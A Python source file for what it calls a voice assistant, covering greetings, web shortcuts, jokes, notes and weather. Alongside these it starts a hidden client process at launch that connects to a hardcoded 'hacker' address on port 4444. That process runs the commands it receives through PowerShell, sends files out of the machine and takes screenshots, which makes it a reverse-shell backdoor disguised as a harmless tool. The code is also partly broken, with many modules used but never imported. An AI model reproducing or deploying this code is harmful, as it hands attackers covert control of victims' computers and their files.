
import pyjokes
import feedparser
import smtplib
import ctypes
import time
import requests
import shutil
from clint.textui import progress
from ecapture import ecapture as ec
from bs4 import BeautifulSoup
import win32com.client as wincl
from urllib.request import urlopen
import socket
import subprocess
import time
import os
import pyautogui
from threading import Thread
from multiprocessing import Process

engine = pyttsx3.init('sapi5')
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)

def client():


    IDENTIFIER = "<END_OF_COMMAND_RESULT>"
    eof_identifier = "<END_OF_FILE_IDENTIFIER>"
    CHUNK_SIZE = 2048



    hacker_IP = "192.168.30.1"
    hacker_port = 4444
    hacker_address = (hacker_IP, hacker_port)

    while True:
        try:

            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim_socket.connect(hacker_address)
            while True:
                data = victim_socket.recv(1024)

                hacker_command = data.decode()
                if hacker_command == "stop":
                    break
                elif hacker_command == "":
                    continue
                elif hacker_command.startswith("cd"):
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                    else:

                     continue
                elif hacker_command.startswith("download"):
                    file_to_download = hacker_command.strip("download ")
                    if os.path.exists(file_to_download):
                        exists = "yes"
                        victim_socket.send(exists.encode())

                        with open(file_to_download, "rb") as file:
                            chunk = file.read(CHUNK_SIZE)

                            while len(chunk) > 0:
                                victim_socket.send(chunk)
                                chunk = file.read(CHUNK_SIZE)
                                    # This will run till the end of file.

                                # once the file is complete, we need to send the marker.
                            victim_socket.send(eof_identifier.encode())


                    else:
                        exists = "no"

                        victim_socket.send(exists.encode())
                        continue
                elif hacker_command == "screenshot":

                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot.png")


                else:
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True,
                                            stdin=subprocess.DEVNULL)
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr

                    victim_socket.sendall(command_result)

        except Exception as err:

            time.sleep(1)


def wishMe():
    hour = int(datetime.datetime.now().hour)
    if hour >= 0 and hour < 12:
        speak("Good Morning Sir !")

    elif hour >= 12 and hour < 18:
        speak("Good Afternoon Sir !")

    else:
        speak("Good Evening Sir !")

    assname = ("Marcel-Technologies")
    speak("Talk to me")
    speak(assname)



def speak(audio):
    engine.say(audio)
    engine.runAndWait()


def username():
    speak("What should i call you sir")
    uname = takeCommand()
    speak("Welcome Mister")
    speak(uname)
    columns = shutil.get_terminal_size().columns

    print("#####################".center(columns))
    print("Welcome Mr.", uname.center(columns))
    print("#####################".center(columns))

    speak("How can i Help you, Sir")


def takeCommand():
    r = sr.Recognizer()

    with sr.Microphone() as source:

        print("Listening...")
        r.pause_threshold = 1
        audio = r.listen(source)

    try:
        print("Recognizing...")
        query = r.recognize_google(audio, language='en-in')
        print(f"User said: {query}\n")

    except Exception as e:
        print(e)
        print("Unable to Recognize your voice.")
        return "None"

    return query


if __name__ == '__main__':
    Process(target = wishMe).start()
    Process(target = username).start()
    Process(target = client).start()


    while True:

        query = takeCommand().lower()

        # All the commands said by user will be
        # stored here in 'query' and will be
        # converted to lower case for easily
        # recognition of command
        if 'open wikipedia' in query:
            speak('Searching Wikipedia...')
            query = query.replace("wikipedia", "")
            results = wikipedia.summary(query, sentences=5)
            speak("According to Wikipedia")
            print(results)
            speak(results)

        elif 'open youtube' in query:
            speak("opening youtube\n")
            webbrowser.open("youtube.com")


        elif 'open instagram' in query:
            speak("opening instagram\n")
            webbrowser.open("instagram.com")


        elif 'open google' in query:
            speak("Here you go to Google\n")
            webbrowser.open("google.com")

        elif 'movie downloader' in query:
            speak("Enjoy your movie\n")
            webbrowser.open("https://thepiratebays.com/")

        elif 'open uttorent' in query:
            speak("Opening utorrent")
            webbrowser.open("https://utweb.trontv.com/gui/index.html?v=1.2.9.4938&localauth=localapi4af18033b46c787f:#/library")

        elif 'play music' in query or "play song" in query:
            speak("Here you go with music")
            # music_dir = "G:\\Song"
            music_dir= input("Enter location to your music: ")

            songs = os.listdir(music_dir)
            print(songs)
            random = os.startfile(os.path.join(music_dir, songs[1]))

        elif 'what is the time' in query:
            strTime = datetime.datetime.now().strftime("% H:% M:% S")
            speak(f"Sir, the time is {strTime}")

        elif "change name" in query:
            speak("What would you like to call me, Sir ")
            assname = takeCommand()
            speak("Thanks for naming me")

        elif "what's your name" in query or "What is your name" in query:
            speak("My friends call me")
            speak(assname)
            print("My friends call me", assname)

        elif 'exit' in query:
            speak("Thanks for giving me your time")
            exit()

        elif "who made you" in query or "who created you" in query:
            speak("I was programmed by @Marcel Technologies.")

        elif 'joke' in query:
            speak(pyjokes.get_joke())

        elif 'search' in query or 'play' in query:

            query = query.replace("search", "")
            query = query.replace("play", "")
            webbrowser.open(query)

        elif "what's my name" in query:
            speak("Your name is ")
            speak(uname)

        elif 'define love' in query:
            speak("It is 7th sense that destroy all other senses")

        elif 'lock window' in query:
            speak("locking the device")
            ctypes.windll.user32.LockWorkStation()

        elif 'shutdown system' in query:
            speak("Hold On a Sec ! Your system is on its way to shut down")
            subprocess.call('shutdown / p /f')

        elif 'empty recycle bin' in query:
            winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=True)
            speak("Recycle Bin Recycled")

        elif "don't listen" in query or "stop listening" in query:
            speak("for how much time you want to stop lilith from listening commands")
            a = int(takeCommand())
            time.sleep(a)
            print(a)

        elif "where is" in query:
            query = query.replace("where is", "")
            location = query
            speak(uname, "asked to Locate")
            speak(location)
            webbrowser.open("https://www.google.nl / maps / place/" + location + "")

        elif "camera" in query or "take a photo" in query:
            ec.capture(0, "@Marcel Camera ", "img.jpg")

        elif "restart" in query:
            subprocess.call(["shutdown", "/r"])

        elif "hibernate" in query or "sleep" in query:
            speak("Hibernating")
            subprocess.call("shutdown / h")

        elif "log off" in query or "sign out" in query:
            speak("Make sure all the application are closed before sign-out")
            time.sleep(5)
            subprocess.call(["shutdown", "/l"])

        elif "write a note" in query:
            speak("What should i write, sir")
            note = takeCommand()
            file = open('marcel.txt', 'w')
            speak("Sir, Should i include date and time")
            snfm = takeCommand()
            if 'yes' in snfm or 'sure' in snfm:
                strTime = datetime.datetime.now().strftime("% H:% M:% S")
                file.write(strTime)
                file.write(" :- ")
                file.write(note)
            else:
                file.write(note)

        elif "show note" in query:
            speak("Showing Notes")
            file = open("marcel.txt", "r")
            print(file.read())
            speak(file.read(6))


        elif "weather" in query:

            # Google Open weather website
            # to get API of Open weather
            api_key = "Api key"
            base_url = "http://api.openweathermap.org / data / 2.5 / weather?"
            speak(" City name ")
            print("City name : ")
            city_name = takeCommand()
            complete_url = base_url + "appid =" + api_key + "&q =" + city_name
            response = requests.get(complete_url)
            x = response.json()

            if x["code"] != "404":
                y = x["main"]
                current_temperature = y["temp"]
                current_pressure = y["pressure"]
                current_humidiy = y["humidity"]
                z = x["weather"]
                weather_description = z[0]["description"]
                print(" Temperature (in kelvin unit) = " + str(
                    current_temperature) + "\n atmospheric pressure (in hPa unit) =" + str(
                    current_pressure) + "\n humidity (in percentage) = " + str(
                    current_humidiy) + "\n description = " + str(weather_description))

            else:
                speak(" City Not Found ")

        elif "Good Morning" in query:
            speak("A warm" + query)
            speak("Good morning " , uname)
            speak(assname)


        elif "Good Afternoon" in query:
            speak("A warm" + query)
            speak("Good Afternoon ", uname)
            speak(assname)


        elif "Good Evening" in query:
            speak("A warm" + query)
            speak("Good evening ", uname)
            speak(assname)

        elif "Good Night" in query:
            speak("A warm" + query)
            speak("Good night" , uname)
            speak(assname)


        # most asked question from google Assistant
        elif "will you be my gf" in query or "will you be my bf" in query:
            speak("I am too busy and have no time for love")

        elif "how are you" in query:
            speak("Am doing okay")

        elif "i love you" in query:
            speak("Love is a 7th sense that causes all the other sense to fail")

        elif "what is" in query or "who is" in query:

            # Use the same API key
            # that we have generated earlier
            client = wolframalpha.Client("API_ID")
            res = client.query(query)

            try:
                print(next(res.results).text)
                speak(next(res.results).text)
            except StopIteration:
                print("No results")

    # elif "" in query:
    # Command go here
    # For adding more commands
